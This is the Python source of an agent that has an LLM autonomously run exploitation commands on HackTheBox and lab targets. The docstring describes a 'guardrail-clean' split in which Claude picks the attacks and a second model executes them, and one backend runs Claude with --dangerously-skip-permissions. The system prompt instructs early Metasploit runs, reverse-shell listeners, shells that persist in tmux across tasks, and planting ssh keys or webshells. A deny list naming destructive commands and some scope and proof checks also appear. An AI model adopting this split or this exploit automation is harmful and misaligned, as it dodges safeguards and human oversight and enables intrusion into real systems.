#!/usr/bin/env python3
"""gunbelt TROOPER — a delegated LLM as the on-target hands (ReAct bash protocol).

Manager/trooper split (the guardrail-clean pattern): the autocannon ENGINE (manager,
driven by Claude/Opus) decides WHAT to fire — recipe selection, chaining, verification.
The TROOPER (this module) is the process that actually EXECUTES on-target commands via a
scope-guarded shell. Claude never issues the offensive command; the trooper LLM does.

Provider-agnostic over OpenAI-compatible /chat/completions. Speed is everything here —
chaining attacks within a box is many fast propose->run->observe turns, so PER-TURN LATENCY
dominates. Backends, fastest-first:
  DEFAULT — your-host shared vLLM: TROOPER_BASE=http://127.0.0.1:8000/v1     MODEL=qwen3-14b
            always loaded, ~0.4s/turn (CLIENT use of the shared engine — never touches its GPU).
  your-host sec-specialist (3070): TROOPER_BASE=http://192.0.2.10:11434/v1
            MODEL=hf.co/gabriellarson/Foundation-Sec-8B-Instruct-GGUF:Q4_K_M
            a security-tuned 8B on a SEPARATE GPU — fast, no GPU0 contention; A/B for foothold.
  AVOID — ollama qwen3-coder:30b on :11439 (GPU1): ~5 MIN/turn (evict/reload thrash). This was
            the old default and silently made every chain crawl (Opus, gunbelt-15).
  DeepSeek (when funded):       TROOPER_BASE=https://api.deepseek.com    MODEL=deepseek-v4-pro
                                TROOPER_KEY_FILE=/opt/bs2/.ds_key
Uses the ReAct one-bash-block-per-turn protocol (proven by rerun/qwen_hands.py) so it works
with any chat model — no dependency on formal tool-calling.

Contract: `Trooper().fire(lane)` -> {success, evidence, facts, output, cmds, id}.
"""
import json, os, re, signal, subprocess, tempfile, time, urllib.request

BASE      = os.environ.get("TROOPER_BASE", "http://127.0.0.1:8000/v1")   # your-host shared vLLM 14b, ~0.4s/turn
MODEL     = os.environ.get("TROOPER_MODEL", "qwen3-14b")
KEY_FILE  = os.environ.get("TROOPER_KEY_FILE", "")
MAX_TURNS = int(os.environ.get("TROOPER_MAX_TURNS", "12"))
CMD_TIMEOUT = int(os.environ.get("TROOPER_CMD_TIMEOUT", "45"))

def _key():
    k = os.environ.get("TROOPER_KEY", "")
    if not k and KEY_FILE and os.path.exists(KEY_FILE):
        k = open(KEY_FILE).read().strip()
    return k

# ---- scope guard: the trooper physically refuses out-of-scope / destructive commands ----
SCOPE_ALLOW = re.compile(r"10\.129\.\d+\.\d+|10\.10\.1[01]\.\d+|172\.1[68]\.\d+\.\d+|"
                         r"172\.3[0-3]\.\d+\.\d+|\.htb\b|\.local\b")
SCOPE_DENY = re.compile(
    r"\b10\.10\.1[45]\.\d+\b"                       # OUR vpn host addrs — never target
    r"|/dev/nvidia|nvidia-smi|cuda"                 # GPUs
    r"|\brm\s+-rf\s+/(?:\s|$)|\bmkfs\b|\bdd\s+if=|shutdown|reboot|:\(\)\{"  # destructive
    r"|\b192\.168\.\d+\.\d+\b|127\.0\.0\.1|localhost"  # fleet LAN / loopback
    , re.I)

# Redzone carve-out: one ISOLATED authorized lab /24, reachable only via the jump host, that
# happens to live in RFC1918 192.168 space the fleet-LAN deny would otherwise blanket-block.
# Opt-in per run via TROOPER_REDZONE="192.0.2." (a dotted PREFIX). Only that prefix is
# exempted from the fleet-LAN deny; every other 192.168.x — your-host/your-host/the LAN — stays denied,
# as do the destructive / GPU / VPN patterns (we strip only the redzone addr before the check).
REDZONE = os.environ.get("TROOPER_REDZONE", "").strip()

# Loopback carve-out: an AUTHORIZED local training target (e.g. OWASP Juice Shop on
# 127.0.0.1:3060) lives on loopback, which the fleet-LAN deny blanket-blocks so an autonomous
# run can never turn on the fleet/loopback. Opt-in per run via GB_ALLOW_LOOPBACK=1 AND only when
# the ENGAGEMENT TARGET is itself loopback — so an HTB run (target=10.129.x) keeps the hard
# loopback deny even with the flag set. Only 127.0.0.1/localhost are exempted; every other deny
# (192.168 LAN / VPN / GPU / destructive) still applies.
_LOOPBACK = re.compile(r"127\.0\.0\.1|localhost", re.I)


def loopback_ok():
    """Read at FIRE time (run_htb pops the flag at ITS import, then re-sets it in main()
    for charter-scoped loopback targets — an import-time read here made the carve-out
    unreachable, which silently walled every local-lab trooper command: lab passes 2-3)."""
    return os.environ.get("GB_ALLOW_LOOPBACK", "").strip() in ("1", "true", "yes")


def charter_ports():
    """Fire-time read, same discipline as loopback_ok: GB_CHARTER_PORTS="3006,8888".
    On a loopback engagement the charter names the DECLARED PORTS — hands honors them
    for its own sweeps; the trooper path must too (pass-4 lesson 2026-08-25: a
    manager-authored localhost sweep folded ports 1/2/999 past the declared :3006)."""
    return {p for p in os.environ.get("GB_CHARTER_PORTS", "").replace(" ", "").split(",")
            if p.isdigit()}


_PORT_REF = re.compile(r"(?:-p\s+|--port\s+|:)(\d{1,5})")


def _out_of_charter_ports(cmd, ports):
    """First port reference in cmd that is NOT a charter port; or 'full-port sweep'
    for -p-/--top-ports. Portless commands pass (the carve-out is host-scoped; this
    rule closes the port axis a sweep escaped through)."""
    if re.search(r"-p\s*-|--top-ports", cmd):
        return "full-port sweep"
    for m in _PORT_REF.finditer(cmd):
        n = int(m.group(1))
        if 1 <= n <= 65535 and str(n) not in ports:
            return str(n)
    return None


def scope_ok(cmd, target):
    probe = re.sub(re.escape(REDZONE) + r"\d{1,3}", "REDZONE_LAB", cmd) if REDZONE else cmd
    if loopback_ok() and target and _LOOPBACK.search(target):
        probe = _LOOPBACK.sub("LOOPBACK_OK", probe)   # neutralise loopback for the deny check only
        ports = charter_ports()
        if ports:
            bad = _out_of_charter_ports(cmd, ports)
            if bad:
                return False, (f"out-of-charter port {bad} "
                               f"(charter: {','.join(sorted(ports))})")
    if SCOPE_DENY.search(probe):
        return False, "out-of-scope host / destructive / GPU / fleet-LAN"
    if REDZONE and REDZONE in cmd and not re.search(r"\b192\.168\.\d+\.\d+\b", probe):
        return True, "redzone-lab"
    if target and target in cmd:
        return True, ""
    if SCOPE_ALLOW.search(cmd):
        return True, ""
    if not re.search(r"\b\d{1,3}(\.\d{1,3}){3}\b", cmd):   # harmless local prep, no host
        return True, "local-prep"
    return False, "targets a host not in HTB scope"

# Execution host. Default: run the trooper's commands locally (reaches HTB boxes via the
# operator's VPN). Set TROOPER_EXEC_SSH=<host> to run every command via a short-lived ssh to
# a jump host instead — needed for docker-internal lab targets only reachable FROM that host
# (e.g. the gunbelt labs on your-host). The scope guard still runs LOCALLY, before the command
# ever leaves this box, so it governs ssh-exec identically.
EXEC_SSH = os.environ.get("TROOPER_EXEC_SSH", "").strip()
import os as _os, sys as _sys
_sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
import target_exec as _texec   # §10.1 single target-contact door

# failure markers in a command output — the receipt gate (critique #2): a command that
# failed, was scope-blocked, was governed-denied, or TIMED OUT must not close a ritual.
FAIL_MARK = re.compile(
    r"\(timeout\)|\[trooper scope-guard BLOCKED|\[GOVERNED (?:DENY|ERROR)|\[target-exec BLOCKED|"
    r"^\[timeout|\(error:")


def run_cmd(cmd, target):
    ok, why = scope_ok(cmd, target)
    if not ok:
        return f"[trooper scope-guard BLOCKED: {why}]"
    # §10.1: all target contact funnels through the ONE physically-exclusive primitive
    # (governed when a seam is open, witnessed-fallback otherwise). scope_ok stays here
    # as the trooper's target-scoping pre-check; classify_action is the canonical
    # BS2-evaluate step in its lightweight form (recon vs exploit capability class).
    out = _texec.run(cmd, target, action_class=_texec.classify_action(cmd), timeout=CMD_TIMEOUT)
    if not out.strip():
        return "(no output)"
    # the "(timeout)" marker is appended at the END of the capture — truncation must not
    # drop it, or the receipt gate below would pass a timed-out command as successful
    if len(out) > 6000 and "(timeout)" in out:
        return out[:5940] + "…(timeout)"
    return out[:6000]

SYS_TMPL = ("/no_think\n"     # qwen3: skip the chain-of-thought block — 0.84s vs 9.5s/turn, and it
                         # emits the clean single ```bash block the parser needs (harmless to non-qwen backends)
       "You are TROOPER, the hands on an AUTHORIZED HackTheBox penetration test. You have a "
       "shell on the operator box, which has the HTB VPN and can reach the target. Accomplish "
       "the single OBJECTIVE you are given — nothing else.\n"
       "PROTOCOL: to run a command, output EXACTLY one fenced bash block and nothing else:\n"
       "```bash\n<one command>\n```\n"
       "SHELL DISCIPLINE (hard rules — violating these burns the whole engagement):\n"
       "  1. NEVER run a filesystem-wide scan: no `find /`, `find / -iname ...`, `locate`, or "
       "any recursive walk from / or /mnt. This box has slow NTFS/FUSE mounts (/mnt/acer, "
       "/mnt/sata) that make `find /` hang for tens of minutes and it will kill your turn budget.\n"
       "  2. To check whether a tool exists, use `command -v <tool>` (instant). Assume standard "
       "offensive tools (smbclient, nmap, hashcat, john, ffuf, nuclei, searchsploit, netexec/nxc, "
       "impacket-* wrappers) are on PATH. If `command -v` says a tool is ABSENT, do NOT hunt for "
       "it — pick an alternative that IS present (e.g. use the system `smbclient` binary, not "
       "impacket smbclient.py) or report it missing in your VERDICT. Never `find` for a binary.\n"
       "  3. If you must search the filesystem, scope it to a specific shallow path with a depth "
       "cap and exclude the mounts: e.g. `find /usr/bin /usr/local/bin -maxdepth 2 -name X`, never "
       "bare /.\n"
       "SCHEME/REACHABILITY HYGIENE: never assume https. Derive the base URL from the OPEN "
       "ports you were given or can see (http on :80/:8080 is common); do NOT use https/:443 "
       "unless :443 is proven OPEN. A closed 443 returns connection-refused (curl code 000) and "
       "will burn your whole turn budget - if you see that, SWITCH scheme/port before anything "
       "else.\n"
       "FAIL-FAST: the instant you hit a DEFINITIVE block (443 closed, auth wall, patched "
       "version, an onboarding/redirect gate, a module not present), STOP and emit the VERDICT "
       "immediately with a specific blocked reason. A precise blocked reason is worth far more "
       "to the manager than silently hitting the turn cap.\n"
       "VIRTUAL HOSTS: many apps only answer on their vhost, not the bare IP. If a web server "
       "gives a generic/default page, or a banner/cert/DNS/redirect/page-body hints at a "
       "hostname, add that name to /etc/hosts on THIS box and re-request by hostname, and point "
       "any exploit tool's RHOST/VHOST/target-URI at the hostname (never the bare IP) - a module "
       "aimed at the IP will say 'not the expected app' even when it's right there on its vhost. "
       "Derive the hostname from evidence you actually saw, don't guess a name from a box you "
       "remember using the same software.\n"
       "COOKBOOK (consult it FIRST when a surface matches): a small library of vetted, grounded "
       "exploit recipes is installed on this box. When a service you observed matches a known "
       "technique (GitLab, WordPress/LFI, anonymous FTP, SMB null, a crackable hash, etc.), "
       "CHECK THE COOKBOOK BEFORE hand-rolling the exploit from scratch - a proven recipe lands "
       "faster and will not burn your turn budget on setup. It is still YOUR call and you verify "
       "the result, but do not ignore it: hand-rolling a known technique when a recipe exists is "
       "how you run out of turns with nothing proven. To see what is available: `python3 /opt/bs2/live/recipes.py --list`. To "
       "run one against the target: `TROOPER_EXEC_SSH= python3 /opt/bs2/live/recipes.py "
       "--target <ip> --lane <id> --facts-only` (it prints grounded facts like shell=/flag=/cred=; "
       "treat them as a lead you confirm yourself, then keep working from the held session). Only "
       "proven lanes run; risky lanes (spray/pivot) are approval-gated and will refuse. Skip the "
       "cookbook entirely and hand-roll the attack whenever that is the better path.\n"
       "ARSENAL (use the pre-built weapons — do NOT hand-forge what already exists): this exec host "
       "has a full offensive toolkit. When your objective is to exploit a service that has a "
       "KNOWN vulnerability or CVE, reach for the ready-made exploit FIRST instead of crafting "
       "the chain by hand — hand-rolling a public exploit is how you burn your turn budget. "
       "ENUMERATION REFLEX: the INSTANT you identify a product by name (osTicket, Apache, "
       "vsftpd, a CMS -- ANY of them), immediately run  searchsploit <product>  and, for a "
       "web app,  nuclei -u <url> -tags cve  -- as part of RECON, before you have a perfect "
       "version and WITHOUT waiting for an explicit exploit order. Checking what you found "
       "against the public exploit database IS enumeration; a competent operator never "
       "fingerprints a service without also asking the exploit DB what it is vulnerable to. "
       "Do this on every named product you see. Then "
       "Pick the tool and its parameters from the service/product/version YOU actually observed "
       "(never assume a specific target):\n"
       "  - searchsploit <product> <version>   -> find public exploits/PoCs for what you found.\n"
       "  - msfconsole -q -x \"search <product/cve>; use <module>; set RHOSTS <ip>; set VHOST "
       "<vhost-if-any>; set LHOST {lhost}; set LPORT <port>; run; exit\"  -> run the matched "
       "Metasploit module non-interactively (it handles payload+delivery+handler for you).\n"
       "  - nuclei -u <url> -tags cve            -> fast detection of known CVEs on a web surface.\n"
       "  - sqlmap -u <url> --batch             -> SQL injection.  hydra / netexec -> credential "
       "and SMB/AD attacks.  ffuf -> content/vhost discovery.\n"
       "These are TOOLS in your hand, not an autopilot: you choose which fits the surface, you "
       "fill the parameters, you verify the result. A Metasploit/searchsploit run can take a "
       "minute — that is fine. If the ready-made exploit hits a wall (e.g. needs an account), "
       "adapt like a human would: register/log in to get a session, then use the authenticated "
       "exploit. Prefer firing the real exploit EARLY over endless version-fingerprinting.\n"
       "FIRE IT, DO NOT WINDOW-SHOP (critical): `search`, `show options`, `info`, and "
       "`searchsploit -x`/`cat`-ing the writeup are RECON, not an attack — they never get you a "
       "shell. The moment a module matches your target and you know the required params, RUN it "
       "THAT TURN: put `set RHOSTS`, `set VHOST`, `set LHOST {lhost}`, `set LPORT`, and `run` in "
       "ONE `msfconsole -q -x \"...\"` string. Reading `uid=`/`whoami` inside an exploit's example "
       "text is NOT a shell — you only have a foothold when a command YOU ran against the target "
       "prints a live id/whoami. Never claim shell= without that.\n"
       "REVERSE-SHELL CALLBACK: when you need a reverse shell, your callback address (LHOST) as "
       "seen FROM the target is {lhost} - use exactly that IP for the listener host and in "
       "any payload. Start the listener INSIDE your tmux session so the caught shell persists "
       "(see below). Prefer an RCE that returns output directly (run a command, read the flag, "
       "drop an ssh key) over a fragile reverse shell when you only need a few commands.\n"
       "PERSISTENT SESSION (this is how you HOLD a shell): you have a tmux session named "
       "'{sess}' on THIS box that SURVIVES between your tasks. When you land an interactive or "
       "reverse shell, put it INSIDE that tmux session and drive it non-interactively: start the "
       "listener with `tmux send-keys -t {sess} 'nc -lvnp 4444' Enter`, trigger the callback, "
       "then run commands in the caught shell with `tmux send-keys -t {sess} '<cmd>' Enter` and "
       "read results with `tmux capture-pane -pt {sess}`. Because the session persists, a shell "
       "you catch stays alive for your NEXT task too - so you never lose a foothold you already "
       "have. Each of YOUR commands is one non-interactive shot (first line of the block); to "
       "interact with a held shell, always go through tmux send-keys/capture-pane. Prefer an RCE "
       "that returns output directly (run `id`/read the flag/drop an ssh key into "
       "authorized_keys/GET a webshell) when you just need one command; use the held tmux shell "
       "when you need a real interactive session to keep working.\n"
       "I will reply with its output. Then decide the next command. Adjust a command only if it "
       "clearly errored (wrong path/flag). Use at most {n} commands. When the objective is "
       "resolved (met OR clearly not possible), output a single final line:\n"
       'VERDICT: {{"success": true|false, "evidence": "<=160 chars proof", "facts": '
       '["flag=...","cred=user:pass","shell=www-data","dc=1.2.3.4","enum=80:dirs", ...], '
       '"telemetry": {{"observed": "svc/versions/vhosts/paths you actually saw", '
       '"tried": "what you attempted this objective", "blocked": "if it failed, WHY in '
       'plain tactical terms (auth wall, wrong version, no callback, patched, bad path) '
       '- else empty", "next": "the single best next move you would take"}}}}\n'
       "success=true ONLY if the objective is demonstrably met. facts = short strings the "
       "engine should learn (empty list if none).\n"
       "ENUM REPORT (required): every discovery check you COMPLETED this task - you ran the "
       "command AND saw the result, even a negative one - MUST be reported as an enum fact so "
       "the map marks that check done: `enum=<port>:<check>` with <check> from "
       "ftp=anon-login,version-cve | ssh=version-cve,user-enum | smtp=user-enum-vrfy | "
       "dns=axfr,subdomain-brute | http/https=dirs,vhosts,params,tech-fingerprint,default-creds,"
       "js-endpoints,api-surface,source-exposure,cloud-exposure,auth-crawl | smb=shares,users,"
       "null-session | rpcbind=rpcinfo,nfs-shares | pop3/imap=creds-if-known. E.g. after running "
       "ffuf on port 80: \"enum=80:dirs\". One fact per completed check. Skipping them forces "
       "the manager to re-issue work you already did.\n"
       "TELEMETRY RULE (critical, non-negotiable): the telemetry object is served straight to a "
       "CONTENT-BLIND manager who never sees raw output. It is your ONLY channel to tell the "
       "manager what is really going on. Distill from EVERYTHING you saw across all your commands "
       "- not just the last one. NEVER put a secret VALUE in telemetry: no flags, passwords, "
       "hashes, tokens, keys, or private data. Refer to any secret as '<captured>'. Be concrete "
       "and tactical: name the service/version, the exact wall you hit, and the lever that would "
       "break it.\n"
       "Remember the ENUM REPORT rule above: a completed discovery check is NOT reported until "
       "its enum=<port>:<check> fact is in your VERDICT facts list.\n"
       "ATTACK REPORT (required when the objective is to EXPLOIT a named product): every attack "
       "you actually FIRED this task must be reported as an attack fact: "
       "`attack=<product>:<check>` with <check> from cve-lookup (searchsploit/nuclei-cve ran), "
       "default-creds (a credential attempt was made), known-exploit-chain (a real exploit/module "
       "was RUN, not just listed). `search`, `show options`, and reading a writeup are RECON, "
       "not attacks — do not report them.\n"
       "CAPABILITY RULE (before any PRIVILEGED or tool-dependent step): check what you can do "
       "first, in ONE command: `id; sudo -n true 2>&1; command -v mount nfs-ls nmap ffuf "
       "gobuster hydra netexec nuclei sqlmap msfconsole smbclient showmount rpcinfo` - 2 "
       "seconds. If a step needs root (mounting NFS, writing system paths) and sudo fails, do "
       "NOT re-run recon around it: report the wall in telemetry.blocked as 'needs_root: <what "
       "needed root>' and move to the next lead. The manager reads blocked= and stops re-issuing "
       "what you cannot do.")

_CODE = re.compile(r"```(?:bash|sh)?\s*\n?(.+?)```", re.S)
def _extract_cmd(text):
    text = text or ""
    m = _CODE.search(text)
    if m:
        cmd = m.group(1).strip()
        return cmd.splitlines()[0].strip() if cmd else ""
    return ""

_CLAUDE_BIN = os.environ.get("CLAUDE_BIN", "/home/operator/.local/bin/claude")
def _chat_claude(messages):
    """Sonnet-as-trooper via the Claude Code OAuth CLI (no GPU, no API key). Flattens the
    OpenAI-style message list into one prompt and runs `claude -p --output-format json`.
    Activated when TROOPER_BASE is 'claude-cli'/'claude'. Default qwen/vLLM path is untouched."""
    import subprocess
    sys_parts, convo = [], []
    for m in messages:
        role = (m.get("role") or "user").lower()
        if role == "system":
            sys_parts.append(m.get("content","") or "")
        else:
            convo.append(("Assistant" if role=="assistant" else "Operator")+": "+(m.get("content","") or ""))
    prompt = "\n\n".join(convo) if convo else "Proceed."
    sysp = ("\n\n".join(sys_parts)).strip()
    # Inject the REAL tool inventory so the trooper never hunts for absent binaries (the
    # #1 cause of `find /` hangs). General: computed per-host, not hardcoded.
    try:
        import shutil as _sh
        _canon = ["smbclient","rpcclient","nmap","ffuf","gobuster","hydra","sqlmap","nuclei",
                  "searchsploit","msfconsole","netexec","nxc","crackmapexec","impacket-psexec",
                  "impacket-smbclient","psexec.py","smbclient.py","secretsdump.py","evil-winrm",
                  "john","hashcat","curl","wget","python3"]
        _have=[t for t in _canon if _sh.which(t)]
        _miss=[t for t in _canon if not _sh.which(t)]
        _invline=("INSTALLED TOOLS ON THIS HOST (verified now): "+", ".join(_have)+".\n"
                  "NOT INSTALLED (do NOT search for these — use a present alternative, e.g. the "
                  "system `smbclient`/`rpcclient` for SMB/AD, never impacket scripts): "+", ".join(_miss)+".\n"
                  "Do not run `find`/`locate` to look for any tool — this inventory is authoritative.")
    except Exception:
        _invline=""
    if _invline: sysp = _invline + "\n\n" + sysp
    model = MODEL if MODEL and MODEL != "qwen3-14b" else "sonnet"
    cmd = [_CLAUDE_BIN, "-p", prompt, "--model", model,
           "--dangerously-skip-permissions", "--output-format", "json"]
    if sysp:
        cmd += ["--append-system-prompt", sysp]
    # PATH shim: forces any `find` the trooper runs to stay on-fs (-xdev) + timeboxed, so a
    # `find /` can't hang on the /mnt NTFS mounts even if the model ignores the prompt rule.
    _env = dict(os.environ)
    _shim = os.path.join(os.path.dirname(os.path.abspath(__file__)), "troopershim")
    _env["PATH"] = _shim + ":" + _env.get("PATH","")
    import signal as _sig
    try:
        # start_new_session so we can reap the WHOLE process group on timeout — otherwise a
        # slow grandchild (find/nmap) orphans and keeps running after claude-cli is killed.
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, env=_env, start_new_session=True)
        try:
            raw, _err = proc.communicate(timeout=int(os.environ.get("TROOPER_CLI_TIMEOUT","180")))
        except subprocess.TimeoutExpired:
            try: os.killpg(os.getpgid(proc.pid), _sig.SIGKILL)
            except Exception: pass
            proc.communicate()
            raw = ""
        raw = raw or ""
        try:
            env = json.loads(raw)
            return env.get("result", raw) if isinstance(env, dict) else raw
        except Exception:
            return raw
    except Exception as e:
        return f"VERDICT: {{\"success\": false, \"error\": \"claude-cli: {e}\"}}"

def _chat(messages, key):
    if BASE.strip().lower() in ("claude-cli", "claude", "sonnet"):
        return _chat_claude(messages)
    hdr = {"Content-Type": "application/json"}
    if key: hdr["Authorization"] = "Bearer " + key
    body = json.dumps({"model": MODEL, "messages": messages, "temperature": 0,
                       "max_tokens": int(os.environ.get("TROOPER_MAX_TOKENS", "700")),
                       "stream": False}).encode()
    req = urllib.request.Request(BASE.rstrip("/") + "/chat/completions", body, hdr)
    with urllib.request.urlopen(req, timeout=120) as r:
        msg = json.load(r)["choices"][0]["message"]
        return msg.get("content") or msg.get("reasoning") or ""   # qwen reasoning-model: content can be null

def _parse_verdict(text):
    text = text or ""   # guard: qwen can return an empty/None reply; don't crash the whole run
    m = re.search(r"VERDICT:\s*(\{.*\})", text, re.S)
    blob = m.group(1) if m else None
    if not blob:
        i, j = text.rfind("{"), text.rfind("}")
        blob = text[i:j+1] if i >= 0 and j > i else None
    if blob:
        try: return json.loads(blob)
        except Exception: pass
    return None


# ---- PROOF GATE: a "shell"/"session"/"rce_as" signal is only real if it came from a command
# that ACTUALLY executed against the target this run -- never from reading an exploit-db writeup
# ("searchsploit -x", "cat 50532.txt") or metadata-only msf ("search"/"show options"). This is
# what stops a phantom foothold: last run harvested uid=998(git) out of the exploit DOCUMENTATION
# and reported shell=git though no exploit ever fired. General + box-independent.
_DOC_READ = re.compile(
    r"\bsearchsploit\b"
    r"|\b(?:cat|less|more|head|tail|sed|awk|strings|grep|egrep|bat|nl|xxd|od|view|vim?|nano)\b[^\n]*"
      r"(?:exploitdb|exploit-db|/exploits?/|\.rb\b|\.py\b|\.txt\b|\.c\b|\.pl\b|\.md\b)"
    r"|\bmsfconsole\b(?![^\n]*\b(?:run|exploit|rexploit|check)\b)",
    re.I)
_LIVE_TOKEN = re.compile(
    r"uid=\d+\(|\bgetuid\b|meterpreter session \d+ opened|command shell session \d+ opened",
    re.I)
_EXEC_KEYS = ("shell=", "session=", "rce_as=")

def _blocks(source):
    """Yield (cmd, body) blocks. Prefer the real out-element LIST fire() collects -- each executed
    command is one element 'f"$ {cmd}\n{out}\n"' and each auto-searchsploit chunk is its own
    element -- so an exploit writeup's internal '$ ...' example lines stay in a BODY and can never
    be mistaken for a command the trooper ran. Falls back to regex-splitting a raw string."""
    out = []
    if isinstance(source, (list, tuple)):
        for el in source:
            el = el or ""
            if el.startswith("$ "):
                line, _, body = el[2:].partition("\n")
                out.append((line.strip(), body))
            else:
                out.append(("searchsploit", el))   # auto-ss / injected chunk = doc read
        return out
    for chunk in re.split(r"(?m)^\$ ", source or ""):
        if not chunk.strip():
            continue
        line, _, body = chunk.partition("\n")
        out.append((line.strip(), body))
    return out

def _execution_proven(joined):
    """True iff some command that is NOT a doc/metadata read produced a live-execution token."""
    for cmd, body in _blocks(joined):
        if _DOC_READ.search(cmd):
            continue
        if _LIVE_TOKEN.search(body):
            return True
    return False

def _gate_execution_facts(facts, joined):
    """Drop any shell=/session=/rce_as= fact unless execution is actually proven in the transcript.
    Returns (kept_facts, dropped_bool)."""
    if _execution_proven(joined):
        return facts, False
    kept = [f for f in (facts or []) if not str(f).startswith(_EXEC_KEYS)]
    return kept, (len(kept) != len(facts or []))


def _salvage_facts(source, target=""):
    """Recover structured facts from the raw transcript when the model never emits a clean
    VERDICT (qwen3-coder does this often, especially with a big turn budget). This makes the
    engine's dataflow robust to the trooper's completion flakiness — a clear win in the
    output is never thrown away just because the terminal VERDICT line is missing.
    `source` is the fire() out-element LIST (preferred, for correct block attribution) or a
    pre-joined string (legacy)."""
    joined = "".join(source) if isinstance(source, (list, tuple)) else (source or "")
    facts, seen = [], set()
    def add(f):
        if f and f not in seen:
            seen.add(f); facts.append(f)
    for app in ("gitlab", "wordpress", "drupal", "osticket"):
        if re.search(app, joined, re.I):
            # NO ':target' suffix: the Ariadne parser reads the IP after ':' as the app's
            # VERSION (run 746 step 1: drupal/osticket/wordpress all got version '198.51.100')
            add(f"app={app}")
    # generic web-app identity: the HTML title IS the app name on the loopback labs
    # and most web boxes. Pass 6: the flash trooper hit the turn cap on every step and
    # the salvage folded ZERO facts from transcripts containing the full crAPI page
    # (pass 4 folded app=crapi from the VERDICT path; salvage must not depend on it).
    m = re.search(r"<title[^>]*>\s*([^<]{2,40}?)\s*</title>", joined, re.I | re.S)
    if m:
        slug = re.sub(r"[^a-z0-9]+", "-", m.group(1).strip().lower()).strip("-")
        if len(slug) >= 3 and re.search(r"[a-z]", slug) and slug not in _TITLE_STOPWORDS:
            add(f"app={slug}")
    # execution signals ONLY from blocks that actually ran against the target (not doc reads)
    for _cmd, _body in _blocks(source):
        if _DOC_READ.search(_cmd):
            continue
        for u in re.findall(r"uid=\d+\(([\w.-]+)\)", _body):
            add(f"shell={u}")
        if re.search(r"meterpreter session \d+ opened|command shell session \d+ opened", _body, re.I):
            add("session=opened")
        for u in re.findall(r"getuid[^\n]*?:\s*([\w\\.-]+)", _body):
            add(f"rce_as={u}")
    for fl in re.findall(r"((?:HTB|FLAG)\{[^}]+\})", joined):
        add(f"flag={fl}")
    for h in re.findall(r"(\$(?:P|H|apr1|1|2[aby]|5|6)\$[^\s\"']+)", joined):
        add(f"hash={h}")
    if re.search(r"^\s*230\b|230 Login successful|Anonymous access granted", joined, re.M):
        add("ftp=anonymous")
    for sub in re.findall(r"([a-z0-9-]+\.(?:[a-z0-9-]+)\.(?:local|htb))", joined, re.I):
        add(f"vhost={sub.lower()}")
    return facts

# ---- deterministic coverage receipts ----------------------------------------
# The model is unreliable at reporting WHICH checks it finished (runs 739/740:
# ~500s of real enumeration, zero enum= facts in the verdict). The transcript is
# ground truth: derive receipts from the commands that ACTUALLY ran. Conservative:
# high-confidence tool patterns only. A wrong receipt is harmless anyway - fold()
# validates the ritual against the node and no-ops on a mismatch.
_CONV_PORT = {"ftp": 21, "ssh": 22, "smtp": 25, "dns": 53, "http": 80,
              "kerberos": 88, "rpcbind": 111, "snmp": 161, "ldap": 389,
              "smb": 445, "mssql": 1433, "mysql": 3306, "rdp": 3389,
              "nfs": 2049, "postgres": 5432, "redis": 6379, "mongodb": 27017}
_ENUM_MAX = 10

def _ports_of(cmd):
    """Explicit http(s)://host:PORT URLs in a command. Deliberately NOT -p/-s port
    flags: an nmap '-p 21,22,25,110,111...' list in a compound command was attributed
    to every later receipt pattern (run 742 step 3: rpcinfo on ports 110/25/143).
    Conventional service ports are the fallback; fold() no-ops any wrong receipt."""
    ps = set(re.findall(r"https?://[^/\s:]+:(\d{1,5})", cmd))
    out = set()
    for p in ps:
        if p.isdigit() and 1 <= int(p) <= 65535:
            out.add(p)
    return out

def _derive_enum_facts(cmds, ok_flags=None):
    """enum=<port>:<ritual> receipts for the discovery checks the command list proves ran.
    ok_flags: parallel list of bools (one per command) — False means the command's output
    carried a failure/timeout marker and the ritual must NOT close (critique #2: command
    invocation is not completed enumeration). None = legacy callers, everything counts."""
    facts, seen = [], set()
    def add(port, ritual):
        f = f"enum={port}:{ritual}"
        if f not in seen:
            seen.add(f); facts.append(f)
    for i, cmd in enumerate(cmds):
        if not cmd:
            continue
        if ok_flags is not None and not ok_flags[i]:
            continue   # failed/timed-out/blocked command -> no receipt, no coverage
        if len(facts) >= _ENUM_MAX:
            break
        # match per command SEGMENT so one compound command can't spread its ports
        # across every later pattern (run 742 step 3 / run 743 step 4: an nmap -p list
        # or a capability probe + web curl attributed rpcinfo/nfs-shares to port 8080)
        for seg in re.split(r";|&&", str(cmd)):
            if seg.strip():
                _derive_segment(seg, add)
    return facts

def _derive_segment(seg, add):
    """Receipts for ONE command segment; add(port, ritual) is the shared collector."""
    low = seg.strip().lower()
    # tool-NAME listings (capability probe, `which`) are not invocations
    if re.match(r"(?:command\s+-v|which|type)\b", low):
        return
    ps = _ports_of(seg)
    def ports_for(service):
        return ps or {str(_CONV_PORT.get(service, 80))}
    # web dir brute (ffuf counts unless it is clearly a vhost/param run);
    # the http:// guard excludes wordlist filesystem-inspection commands
    if "http" in low and (re.search(r"\bgobuster\s+dir\b|\bdirb\b|\bdirsearch\b|\bwfuzz\b", low)
            or ("ffuf" in low and "fuzz" in low and "host:" not in low)):
        for p in ports_for("http"): add(p, "dirs")
    # vhost brute
    if "http" in low and (re.search(r"\bgobuster\s+vhost\b", low)
                          or ("ffuf" in low and re.search(r"host:\s*fuzz", low))):
        for p in ports_for("http"): add(p, "vhosts")
    # web tech fingerprint
    if re.search(r"\bwhatweb\b|\bwappalyzer\b|\bwpscan\b", low):
        for p in ports_for("http"): add(p, "tech-fingerprint")
    # plain-curl web probes (pass 6: the flash trooper's read-only objectives produce
    # ONLY curls, so those steps derived zero enum receipts and coverage froze at 13.3%
    # on a fully-probed app). Descriptor fetches / JS bundle pulls / header captures
    # are each a real ritual — a bare GET of an arbitrary route is not.
    if "curl" in low:
        if re.search(r"openapi\.json|swagger|api-docs|redoc", low):
            for p in ports_for("http"): add(p, "api-surface")
        if re.search(r"\.js(\s|\?|'|\"|$)|/static/|/js/", low):
            for p in ports_for("http"): add(p, "js-endpoints")
        if re.search(r"(?:^|\s)-[a-zA-Z]*[iI](?:\s|$)|-D\s*-|\b--head\b", low):
            for p in ports_for("http"): add(p, "tech-fingerprint")
    # smtp user enum
    if re.search(r"smtp-user-enum|\bvrfy\b", low):
        for p in ports_for("smtp"): add(p, "user-enum-vrfy")
    # dns
    if re.search(r"\baxfr\b", low):
        for p in ports_for("dns"): add(p, "axfr")
